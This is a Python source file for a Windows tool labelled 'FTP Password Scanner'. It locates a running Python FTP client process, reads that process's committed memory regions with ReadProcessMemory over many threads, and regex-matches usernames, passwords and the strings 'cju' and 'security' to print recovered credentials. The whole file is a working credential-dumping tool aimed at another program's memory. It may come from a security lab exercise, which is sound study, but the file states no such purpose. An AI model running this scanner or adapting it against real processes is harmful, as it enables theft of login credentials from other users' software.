import psutil
import re
import win32process
import win32con
import win32api
import pywintypes
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import time
import sys

class MemoryScanner:
   def __init__(self):
       self.process = None
       self.process_handle = None
       self.credentials = set()
       self.credentials_lock = threading.Lock()
       self.progress_queue = Queue()

   def find_ftp_process(self) -> bool:
       """FTP 클라이언트 프로세스 찾기"""
       for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
           try:
               if 'python' in proc.name().lower() and \
                  any('main.py' in cmd.lower() for cmd in proc.info['cmdline']):
                   self.process = proc
                   print(f"Found FTP client process (PID: {proc.pid})")
                   return True
           except (psutil.NoSuchProcess, psutil.AccessDenied):
               continue
       return False

   def get_process_handle(self) -> bool:
       """프로세스 핸들 얻기"""
       try:
           self.process_handle = win32api.OpenProcess(
               win32con.PROCESS_VM_READ | win32con.PROCESS_QUERY_INFORMATION,
               False, self.process.pid
           )
           return True
       except Exception as e:
           print(f"Error getting process handle: {e}")
           return False

   def scan_memory_region(self, region):
       """개별 메모리 영역 스캔 (스레드용)"""
       address, size = region
       try:
           data = win32process.ReadProcessMemory(self.process_handle, address, min(size, 1024*1024))
           if data:
               self.find_credentials(data)
           return True
       except:
           return False

   def find_credentials(self, data: bytes):
       """자격 증명 패턴 검색 (스레드 안전)"""
       try:
           if b'cju' not in data and b'security' not in data:
               return

           text = data.decode('ascii', errors='ignore')
           pattern = r'(?:(?:user|username|login)[=:\s]+([a-zA-Z0-9_-]{2,20})|(?:pass|password|pwd)[=:\s]+([a-zA-Z0-9_-]{2,20})|security|cju)'
           
           matches = re.finditer(pattern, text, re.IGNORECASE)
           for match in matches:
               with self.credentials_lock:
                   self.credentials.add(match.group())
       except:
           pass

   def progress_monitor(self, total_regions):
       """진행상황 모니터링 스레드"""
       scanned = 0
       start_time = time.time()
       
       while scanned < total_regions:
           try:
               progress = self.progress_queue.get(timeout=1.0)
               if progress:
                   scanned += 1
                   if scanned % 100 == 0:
                       elapsed = time.time() - start_time
                       progress = (scanned / total_regions) * 100
                       print(f"\rProgress: {progress:.1f}% ({scanned}/{total_regions}) - Time: {elapsed:.1f}s", end="")
           except:
               continue

   def scan_memory(self, max_threads=10):
       """멀티스레드 메모리 스캔"""
       try:
           si = win32api.GetSystemInfo()
           min_address = si[2]
           max_address = si[3]
           page_size = si[1]
           
           print("Mapping memory regions...")
           memory_regions = []
           current_address = min_address
           
           while current_address < max_address:
               try:
                   meminfo = win32process.VirtualQueryEx(self.process_handle, current_address)
                   if (meminfo[3] & win32con.PAGE_READABLE and 
                       meminfo[2] & win32con.MEM_COMMIT and 
                       meminfo[1] > 0):
                       memory_regions.append((current_address, meminfo[1]))
                   current_address += meminfo[1] or page_size
               except:
                   current_address += page_size

           total_regions = len(memory_regions)
           print(f"Found {total_regions} scannable memory regions")
           
           monitor_thread = threading.Thread(target=self.progress_monitor, args=(total_regions,))
           monitor_thread.daemon = True
           monitor_thread.start()

           print(f"\nStarting scan with {max_threads} threads...")
           with ThreadPoolExecutor(max_workers=max_threads) as executor:
               for result in executor.map(self.scan_memory_region, memory_regions):
                   self.progress_queue.put(result)

           print(f"\nScan completed. Found {len(self.credentials)} potential credentials")

       except Exception as e:
           print(f"Error in memory scan: {e}")

   def run(self):
       """메모리 스캐너 실행"""
       print("=== FTP Password Scanner (Windows) ===")
       
       if not self.find_ftp_process():
           print("No FTP client process found!")
           return
       
       if not self.get_process_handle():
           print("Failed to get process handle!")
           return
       
       print("\nScanning memory...")
       self.scan_memory(max_threads=20)
       
       if self.credentials:
           print("\nPossible credentials found:")
           for cred in sorted(self.credentials):
               print(f"- {cred}")
       else:
           print("\nNo credentials found.")
       
       if self.process_handle:
           win32api.CloseHandle(self.process_handle)

def main():
   scanner = MemoryScanner()
   scanner.run()

if __name__ == "__main__":
   main()